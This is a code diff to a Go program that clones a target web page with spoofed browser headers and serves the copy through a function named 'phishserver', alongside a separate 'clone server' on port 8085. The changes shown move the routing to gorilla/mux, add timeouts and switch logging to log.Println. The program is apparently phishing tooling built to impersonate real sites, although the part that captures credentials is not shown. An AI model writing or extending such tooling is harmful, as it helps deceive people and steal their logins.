@@ -3,11 +3,15 @@ package main
 import (
 	"fmt"
 	"io/ioutil"
+	"log"
 	"net/http"
 	"os"
 	"regexp"
 	"strings"
 	"text/template"
+	"time"
+
+	"github.com/gorilla/mux"
 )
 
 var (
@@ -23,11 +27,16 @@ func init() {
 }
 
 func checkerr(err error) {
-	fmt.Println(err)
+	log.Println(err)
 }
 
 func clonehook(urltoclone string) {
 	req, err := http.NewRequest("GET", urltoclone, nil)
+	req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8")
+	req.Header.Add("Accept-Encoding", "*/*")
+	req.Header.Add("Accept-Language", "en-US,en;q=0.9")
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36")
+	req.Header.Set("Referer", req.Host)
 	checkerr(err)
 	client := &http.Client{}
 	resp, err := client.Do(req)
@@ -145,19 +154,45 @@ func index(httpw http.ResponseWriter, req *http.Request) {
 func about(httpwr http.ResponseWriter, req *http.Request) {
 	if req.Method == "GET" {
 		err := abouttmpl.Execute(httpwr, nil)
-		if err != nil {
-			fmt.Println(err)
-		}
+		checkerr(err)
 	}
 }
 
 func startcloneserver() {
-	http.HandleFunc("/thehook", thehook)
-	http.HandleFunc("/about", about)
 
-	http.Handle("/static/css/", http.StripPrefix("/static/css/", http.FileServer(http.Dir("static/css"))))
-	http.ListenAndServe(":"+"8085", nil)
+	router := mux.NewRouter()
+	router.HandleFunc("/thehook", thehook)
+	router.HandleFunc("/about", about)
+	router.PathPrefix("/static/css/").Handler(http.StripPrefix("/static/css/", http.FileServer(http.Dir("static/css"))))
+	srv := &http.Server{
+		Handler: router,
+		Addr:    "0.0.0.0:8085",
+		// Good practice: enforce timeouts for servers you create!
+		WriteTimeout: 180 * time.Second,
+		ReadTimeout:  180 * time.Second,
+	}
+	srv.ListenAndServe()
+	//http.HandleFunc("/thehook", thehook)
+	//http.HandleFunc("/about", about)
 
+	//http.Handle("/static/css/", http.StripPrefix("/static/css/", http.FileServer(http.Dir("static/css"))))
+	//http.ListenAndServe(":"+"8085", nil)
+	//finflag <- "loopback"
+
+}
+func phishserver() {
+	router2 := mux.NewRouter()
+	router2.HandleFunc("/", index)
+	srv := &http.Server{
+		Handler: router2,
+		Addr:    ":" + port,
+		// Good practice: enforce timeouts for servers you create!
+		WriteTimeout: 180 * time.Second,
+		ReadTimeout:  180 * time.Second,
+	}
+	srv.ListenAndServe()
+	//http.ListenAndServe(":"+port, nil)
+	//finflag <- "phishserver"
 }
 func main() {
 	fmt.Println("Hook Started...")
@@ -172,8 +207,12 @@ func main() {
 
 	clonehook(cloneurl)
 	updatehook()*/
+	//finflag := make(chan string)
 	go startcloneserver()
-	http.HandleFunc("/", index)
-	http.ListenAndServe(":"+port, nil)
+	//<-finflag
+	phishserver()
+	//<-finflag
+	//http.HandleFunc("/", index)
+	//http.ListenAndServe(":"+port, nil)
 
 }
